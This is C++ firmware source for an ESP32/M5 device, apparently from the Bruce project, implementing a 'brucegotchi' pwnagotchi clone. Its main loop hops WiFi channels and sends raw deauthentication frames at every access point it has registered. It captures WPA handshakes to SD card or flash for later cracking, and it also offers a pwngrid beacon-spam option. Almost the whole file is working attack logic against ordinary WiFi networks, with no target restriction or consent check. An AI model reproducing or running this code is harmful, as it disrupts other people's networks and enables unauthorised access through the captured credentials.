/*
Thanks to thoses developers for their projects:
* @7h30th3r0n3 : https://github.com/7h30th3r0n3/Evil-M5Core2 and https://github.com/7h30th3r0n3/PwnGridSpam
* @viniciusbo : https://github.com/viniciusbo/m5-palnagotchi
* @sduenasg : https://github.com/sduenasg/pio_palnagotchi

Thanks to @bmorcelli for his help doing a better code.
*/

#include <Arduino.h>
#include "core/mykeyboard.h"
#include "core/wifi_common.h"
#include "ui.h"
#include "spam.h"
#include "../wifi/sniffer.h"
#include "../wifi/wifi_atks.h"

#define STATE_INIT 0
#define STATE_WAKE 1
#define STATE_HALT 255

void advertise(uint8_t channel);
void wakeUp();

uint8_t state;
uint8_t current_channel = 1;
uint32_t last_mood_switch = 10001;
bool pwnagotchi_exit = false;

void brucegotchi_setup() {
    initPwngrid();
    initUi();
    state = STATE_INIT;
    Serial.println("Brucegotchi Initialized");
}

void brucegotchi_update() {
    if (state == STATE_HALT) {
      return;
    }

    if (state == STATE_INIT) {
      state = STATE_WAKE;
      wakeUp();
    }

    if (state == STATE_WAKE) {
      checkPwngridGoneFriends();
      current_channel++; // Sniffer ch variable
      // It will hop through channels 1, 6 and 11 for better performance (most Wifi run in these channels, and by interference we can get 2 before and after the target)
      // it will make us save space on registeredBeacon array, because we find the same beacon in 3 or 4 different channels (same MAC)
      uint8_t chan[3] = {1,6,11};
      if (current_channel == 3) {
        current_channel = 0;
      }
      ch=chan[current_channel];
      advertise(chan[current_channel]);
    }
    updateUi(true);
}

void wakeUp() {
  for (uint8_t i = 0; i < 3; i++) {
    setMood(i);
    updateUi(false);
    delay(1250);
  }
}

void advertise(uint8_t channel) {
  uint32_t elapsed = millis() - last_mood_switch;
  if (elapsed > 2500) {
    setMood(random(2, getNumberOfMoods() - 1)); //random mood
    last_mood_switch = millis();
  }

  esp_err_t result = pwngridAdvertise(channel, getCurrentMoodFace());

  if (result == ESP_ERR_WIFI_IF) {
    setMood(MOOD_BROKEN, "", "Error: invalid interface", true);
    state = STATE_HALT;
  } else if (result == ESP_ERR_INVALID_ARG) {
    setMood(MOOD_BROKEN, "", "Error: invalid argument", true);
    state = STATE_HALT;
  } else if (result != ESP_OK) {
    setMood(MOOD_BROKEN, "", "Error: unknown", true);
    state = STATE_HALT;
  }
}

void set_pwnagotchi_exit(bool new_value) {
  pwnagotchi_exit = new_value;
}

void brucegotchi_start() {
  int tmp = 0;            // Control workflow
  bool shot=false;        // Control deauth faces
  bool pwgrid_done=false; // Control to start advertising
  bool Deauth_done=false; // Control to start deauth
  uint8_t _times=0;       // control delays without impacting control btns
  set_pwnagotchi_exit(false);

  tft.fillScreen(bruceConfig.bgColor);
  num_HS=0; // restart pwnagotchi counting
  SavedHS.clear();
  registeredBeacons.clear(); // Clear the registeredBeacon array in case it has something
  delay(300);  // Due to select button pressed to enter / quit this feature*

  brucegotchi_setup(); // Starts the thing
  // Draw footer & header
  drawTopCanvas();
  drawBottomCanvas();
  memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default)); // prepares the Deauth frame
  _only_HS=true; // Pwnagochi only looks for handshakes

  #if defined(HAS_TOUCH)
    TouchFooter();
  #endif
  brucegotchi_update();

  //Check where to save the Handshakes
  if(setupSdCard()) {
    isLittleFS=false;
    if (!SD.exists("/BrucePCAP")) SD.mkdir("/BrucePCAP");
    if (!SD.exists("/BrucePCAP/handshakes")) SD.mkdir("/BrucePCAP/handshakes");
  } else{
    if (!LittleFS.exists("/BrucePCAP")) LittleFS.mkdir("/BrucePCAP");
    if (!LittleFS.exists("/BrucePCAP/handshakes")) LittleFS.mkdir("/BrucePCAP/handshakes");
    isLittleFS = true;
  }
  tmp=millis();
  // LET'S GOOOOO!!!
  while(true) {
    if(millis()-tmp<2000 && !Deauth_done)  {
      Deauth_done=true;
      drawMood("(-@_@)","Preparing Deauth Sniper");
    }
    if(millis()-tmp>(2000+1000*_times) && Deauth_done && !pwgrid_done) {

      if(registeredBeacons.size()>40) registeredBeacons.clear(); // Clear registered beacons to restart search and avoir restarts
      Serial.println("<<---- Starting Deauthentication Process ---->>");
      for(auto registeredBeacon:registeredBeacons) {
        char _MAC[20];
        sprintf(_MAC, "%02X:%02X:%02X:%02X:%02X:%02X",
            registeredBeacon.MAC[0], registeredBeacon.MAC[1], registeredBeacon.MAC[2], registeredBeacon.MAC[3], registeredBeacon.MAC[4], registeredBeacon.MAC[5]);
        Serial.println(String(_MAC) + " on ch" + String(registeredBeacon.channel) + " -> we are now on ch " + String(ch));
        if(registeredBeacon.channel==ch) {
          memcpy(&ap_record.bssid,registeredBeacon.MAC, 6);
          wsl_bypasser_send_raw_frame(&ap_record,registeredBeacon.channel); //writes the buffer with the information
          send_raw_frame(deauth_frame,26);
        }
      }
      Serial.println("<<---- Stopping Deauthentication Process ---->>");
      drawMood(shot?"(<<_<<)":"(>>_>>)",shot?"Lasers Activated! Deauthing":"pew! pew! pew!");
      _times++;
      shot=!shot;
    }
    if(millis()-tmp>12000 && pwgrid_done==false){
      drawMood("(^__^)","Lets Make Friends!");
      _times=0;
      pwgrid_done=true;
    }
    if(pwgrid_done && millis()-tmp>(12000+ 3000*_times)) {
      _times++;
      advertise(ch);
      updateUi(true);
    }
    if(millis()-tmp>29500) {
      _times=0;
      tmp=millis();
      pwgrid_done=false;
      Deauth_done=false;
      brucegotchi_update();
    }
    if (check(SelPress)) {
      //moved down here to reset the options, due to use in other parts in pwngrid spam
      options = {
        {"Find friends",     [=]()  {  }},
        {"Pwngrid spam",   [=]()  { send_pwnagotchi_beacon_main(); }},
        {"Main Menu",      [=]()  { set_pwnagotchi_exit(true); }},
      };
      // Display menu
      loopOptions(options);
      // Redraw footer & header
      tft.fillScreen(bruceConfig.bgColor);
      updateUi(true);
    }
    if (pwnagotchi_exit) {
      break;
    }
    delay(50);
  }

  // Turn off WiFi
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(nullptr);
  wifiDisconnect();
}
